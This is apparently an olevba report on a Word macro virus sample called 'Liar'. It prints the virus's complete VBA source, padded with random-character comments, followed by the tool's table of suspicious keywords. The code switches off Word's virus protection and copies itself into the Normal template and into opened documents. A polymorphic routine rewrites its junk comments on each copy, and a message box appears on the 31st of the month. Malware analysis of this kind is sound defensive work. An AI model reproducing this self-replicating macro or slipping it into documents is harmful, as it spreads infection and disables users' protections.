olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Liar-210e75aba8e90c6d8038a5f92c1a804c261c5c6b60c71c6db15bf95ae8fbc8d8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Liar-210e75aba8e90c6d8038a5f92c1a804c261c5c6b60c71c6db15bf95ae8fbc8d8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_close() 'ÊÆãá²þ³®¹ûÖ©°ÚŸ¨ú¡ÛË³úÄÑâÁ¿åä­­Å�¤éº�çÊõœ¼þÆõõ°ãûâÙá¡ž×äïï¿Ö
Dim v(150): Options.VirusProtection = False 'éçÔÞ¸þ·¥®ÕË½ÛÂ·¢ó±øÆ×Á±œµúÔÊžñõ�ÑÞ²Î¾¦ Æ°ÁÄÒ�²ë»Õàè¤ á²þ±¼ÜÙÌòíÊÒØÓ¤ø
Set a = MacroContainer.VBProject: Set ab = a.VBComponents(1) '²ýàÉŸöÒÞæÍÂ¬ÿ¶¶Üõ¹ßÛ¡µ¼øµ¬èçÿœìãàýÐÆÝÑ³ûò°ÿœÅ¬¡îèÊôóã¨¨
Set abc = ab.CodeModule: Set s = NormalTemplate: t = Chr(39) '²¾£û«éð®Õ�ÃÇîû¸Í¹Á¸ÅÍßÇÖù¶àÐåäÊÈýèðÐëòÖü¹âíé¥¾Ó¿ã¨ùæãÂ­âÌî¾ÏøãìËçíË¶ÝŸîû¦ñ
Set nh = s.VBProject.VBComponents(1).CodeModule '°î ù¬ è¿÷×ÍêÖÍó­Î¬¹¾ÇéûÚÓ¶å¼«©ëï¯œþÜÊ÷ó÷Ù¾Þüó¢ìÇÑÙ»®¯Ý÷ÿäþõúŸ¿àÛÎ
'°î ù¬ è¿÷×ÍêÖÍó­Î¬¹¾ÇéûÚÓ¶å¼«©ëï¯œþÜÊ÷ó÷Ù¾Þüó¢ìÇÑÙ»®¯Ý÷ÿäþõúŸ¿àÛÎ
For y = 1 To Int(75 - (Rnd * 20)): vx = vx & Chr(255 - Int(Rnd * 100)): Next y '´Äµ¡å²àíúðò÷Ñ¯±ÌèÊ»¯¹ÓÝ ó´¦ô×§¨ä§¯êìÅÄÍ¿ÍçÊ«Þ°üòâÂ¸œß�ÏíÖŸûçâÕÅñà×¯áÆ¿èµà
'´Äµ¡å²àíúðò÷Ñ¯±ÌèÊ»¯¹ÓÝ ó´¦ô×§¨ä§¯êìÅÄÍ¿ÍçÊ«Þ°üòâÂ¸œß�ÏíÖŸûçâÕÅñà×¯áÆ¿èµà
vc = "Sub document_close()" & t & vx & vbCr 'û§ÙÎæ«¡´¡¼�äº¹Üø®ýÇíËöû¨äÆ¾ñÒÚÒÝçþ¶é±îèúÌÊ·ò§©¸ÐîßÌ¶¹öÒÒðóÔÎåã
If MacroContainer = NormalTemplate Then '±øíó¦Í¥ìá·òúë¶ïž»ªØ°œ¨¶¯øÊã®àèîÐÅ µ©ÓÍ§á´¢µÒÜãÆÁôÑ§ÛëÈ®äÃï¯ó¨
'±øíó¦Í¥ìá·òúë¶ïž»ªØ°œ¨¶¯øÊã®àèîÐÅ µ©ÓÍ§á´¢µÒÜãÆÁôÑ§ÛëÈ®äÃï¯ó¨
Set s = ActiveDocument: Set nh = s.VBProject.VBComponents(1).CodeModule 'ñ²¶ÉÔÒçÉôº�ë»Íí£­ÐÒ¡Ã¦ðíûä÷Ü¨üÝçÌÔÓßØ²³É×¦ñÑµ­²Êª³Úº¶âÉìÓ°Õ»©îÅÌ¸«ðÝ¬©éž
vc = "Sub document_open()" & t & vx & vbCr 'ú¿óôèä¡±óî²Ÿ­ÂõæÚþ�Æ±¤ñ±áò×Î£åàññÜþßœ§ÕÜá£Ãñê¿Øê£Ÿà÷µÉº±Þžö´ëè¦¨ÉÙè
End If: Randomize: lin = abc.countoflines 'ÌôÆ®Ÿ¬Ø¾°ÅµùÖÜºÀ¿öÍÓ®ù×ÈãÌ¶°óÈé±ùâÅïºçÛïŸ �á°¦÷ÏóÂõîûöô�áÒ§Ö�´è©ÔéÈ¥ÊÃ·
'ÌôÆ®Ÿ¬Ø¾°ÅµùÖÜºÀ¿öÍÓ®ù×ÈãÌ¶°óÈé±ùâÅïºçÛïŸ �á°¦÷ÏóÂõîûöô�áÒ§Ö�´è©ÔéÈ¥ÊÃ·
For i = 2 To lin 'ìÎ¸§ß¨É¶úø�ËÉêœÎ ÚÁÎÑÈê¿Ç©¹ôÊÿÜéæ£Ä³î­ðÈÂàÎàæ¤Öº£º¡¾ÄáËœ½ôßëÑ»¡ÉýÎáÚ÷©¶·Ù
'ìÎ¸§ß¨É¶úø�ËÉêœÎ ÚÁÎÑÈê¿Ç©¹ôÊÿÜéæ£Ä³î­ðÈÂàÎàæ¤Öº£º¡¾ÄáËœ½ôßëÑ»¡ÉýÎáÚ÷©¶·Ù
jc = "": d = Int(Rnd * 3): p = InStr(abc.Lines(i, 1), t) 'áœ½©ÛÍÚâÃÓ³µ¼çÀÅþ«ìýÃÀÚ÷¥ÇØ¥ûËÄåâýÉá²ùàÅÛæôß èø¡¦ßÝ±½ÚÕí«£¸ºÝÃÖÁ°±Î±ÞÖò
If p = 0 Then GoTo e_ ' ÚõíÇç¼ñªøâïÓÃö©âÐÓêå¸É»®ÒÝÐõª½ìðßÃÃÐ î´µæîä¨÷Üžè«®¼ê Äç ÉÁÿÙ×¬éÒêÊÿ¸¡
If p = 1 And lin > 100 Then 'ØÍíœêüªÍÕÎÖêÜ¸œûÚÙüþÑØÒ¼üàõ¶ÿñË îÙ­âµè£ãñïÿ»ïÁèÙçñ¾ÎùÎÓ°Ýâ
d = 1: GoTo n_ 'âÊ¦Ë¹ÚÓ¡Ðé¿â­è¾Öä»ðÉíâÄºÃ¹ÃåÛç¸ŸØ�ážåŸ­åø·éáÎù½£õúÒÑžßàòÑÈµ¸Üæ°Øó³
End If 'ÏýÃº¾þÞÀ½¹ÖåÑÌÄõÿ¤Æ§ºÿ÷ãøÑï¤°¾°¼®þ·ð«¹ÎÎøË¬Ü÷œëí÷°Ã¶Ü×¸ªŸžñÑ»Ó÷
v(i) = Left(abc.Lines(i, 1), (p - 1)) 'ñ¹¾òîâïûÛêï ÷¢ÆëòÀêØÍ©º¶ÔÊÆÅÄò³ßºòò×í·×»á³ßÿÞ�üýöÔºâ²î×Ä©åÞÐÐ¢õò¬üÔÐ÷²üÖé
'ñ¹¾òîâïûÛêï ÷¢ÆëòÀêØÍ©º¶ÔÊÆÅÄò³ßºòò×í·×»á³ßÿÞ�üýöÔºâ²î×Ä©åÞÐÐ¢õò¬üÔÐ÷²üÖé
For j = 1 To Int(75 - (Rnd * 20))  '½òÇíà¦Û±²œ§œý±ñÃà¬ÏÙª¬¦ð³·ÁþãöŸ§è­Ûåº¡¸éž«œ¹¬Äýý¦ÁÄÁÚÅ±ôýËÌÍÝ
'½òÇíà¦Û±²œ§œý±ñÃà¬ÏÙª¬¦ð³·ÁþãöŸ§è­Ûåº¡¸éž«œ¹¬Äýý¦ÁÄÁÚÅ±ôýËÌÍÝ
jc = jc & Chr(255 - Int(Rnd * 100)) '¬ÉºÞáê³ï¡ó´ßÕó½øžÞ·ù·ñßÔàÏéè»ÜœüðÇ´«²±ùè¥±ì¶ÿ¡ÊÑ³ûßûØäÅ¶ëÑß±Ð½þòÑªææ°ž³Þþé
Next j 'ÌÖ÷òâÅßÔË¹¹Þ�úºÕµ�Ä¤¢ÂÜþ®²µÓŸæ´ßªêëéÄ¦»Î¡ÅÁªÅ­´ìÂ­¹»Üè¤÷ßÿµÝÉº£Úþ­
v(i) = v(i) & t & jc 'Í¼¦çÇñ²£±ü¶ÔáÓµ¤ÁÌ¸»ÉÛÁ©Ïä¤éÿïõéÊß¶ÝØäÓºô÷Õ®©¶œ³â¨ÉÓÍ´¾îÞ×ÎÊ¨ñÓÔêçœÔÏ¦
If d = 2 Then v(i) = v(i) & vbCr & t & jc 'Á¶Ù§·íüèøóÕÂÎÒŸ¿¾×ÿöªÒí©¥Ò�áÛûÅ½œç¡£ÒÖõ³çà³ª¡ÆïÜÂãö»È¦çÇêÛ¯é×Êâž³®Å 
'Á¶Ù§·íüèøóÕÂÎÒŸ¿¾×ÿöªÒí©¥Ò�áÛûÅ½œç¡£ÒÖõ³çà³ª¡ÆïÜÂãö»È¦çÇêÛ¯é×Êâž³®Å 
vc = vc & v(i) & vbCr 'ÍÛÅï¿°ý¢Û¬Ê´öåÃ·¥Ÿ×¤©´å«¸ÐÍì´àÛµžÚÝÇÕÍºÎ¤×ïª¬¤üÝÛÃÚâ¯ÀÆòè³öýÔ²Ï§œ¡½É¸ŸØ
n_: '¥«©žü¦½žòÆ£Ê¾ÂåÛ¬ÞÉÎ¨èùÌã¯ðüÇÀ¦Ùø¹ñÊíž¯ÞÀçÝŸçîÈÁ·½ÈÐ©×÷¨£¸ÿ­èÂúÁòï¦£ö
Next i '¯õâ¨ßáÃÐë¦ÖÈ¶äÃæû×ßžÏÎüò×ª©ðûúî²³áÙÉËöúÆÌóèÆìÜœõÖÌáõ¢¿ù¿õüÐ¡¯ÝÄ¼¿ýïÙ
e_: 'ºÙŸí°¿¶Ö¶ïØüâÖ÷ «óðÔ¿áôèÔÊ«ûâÕúû½ÕŸ¨¶¯ã·žž×´ž¢¬¸Éõ¡«ýå¨ý
If nh.countoflines < 2 Then 'ñÔºì´òé¥ ·ø¶È¨ú¬Ô�¸öìßô¦úãªœ�ýÞ¯õéè°ßæÞëéÕÎÿëÅ¡ö¨�³²»ßºØ¬øô
'ñÔºì´òé¥ ·ø¶È¨ú¬Ô�¸öìßô¦úãªœ�ýÞ¯õéè°ßæÞëéÕÎÿëÅ¡ö¨�³²»ßºØ¬øô
nh.AddFromString vc: s.Save 'Ýù³úíååÑÐ÷œ¡åïÃ«Àó³Ñ¸Û©Ÿúú¡ÊîÖ¤µÔêþëøÈÎÓÊ¦ÃùøæµòÅ­�¯¿½¹è¨·Åº
End If '÷µâ¡å¢µ¬îµ¡ÌÎ¥ÝÿäóßÕíñëñðüÖêîÁ¡¤ÛÜ÷³ßçßÉ¹îÃ±ýÙ¶Þ´åóá¾Ü¸íÝÂìëó¡Óû÷¤æ½Ú©çÐ¬
If Day(Now()) = 31 Then MsgBox Application.UserName & "is bliemed!", 64, "Class.bliem by jacktwo lzo/meta" '­âøøçÁÌ¼¢ÙýøëÔÉ´»¹«·ÙŸêÔú¯Õ¦·¢¥ùÉ¼åÌ¥µ¥á»åûõ¦ÿ¨ÁÎ úçÔüÙ©üó´õ
End Sub '¾ªÈê¢§ñºŸÈþ½ÈÆ¨ÆÂê·ž¨Ù¿ð¸ ­ñÛÛ°£ç× ­ÃÝÜâÑë»¯¹ØÈøÎÍýÍ¥ØÝ¢°ÎŸÍžÓ« Âª£
Rem Another virus by Jack Twoflower [LineZer0 & Metaphase] 'Ô¤õÈââÛ«ÌÄ´úý¥ÇÂÂ¿òªâÈµê¦ÿ§ÈªÏ½¬àÝÉûÑ¨æçöËüùÕØúãë÷ð¹þÀ³Ü§­
Rem Uses "bliem" polymorhic engine by Jack Twoflower '¸ŸðíÿºØÑÙìãªàßÜË§ìàë×õàçÑ»Ç®úçòÎûÏ÷Ÿ¥â·ö¿žèñþÄÏß¡ÁôÊá««Ø²Ð÷Ëõ

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

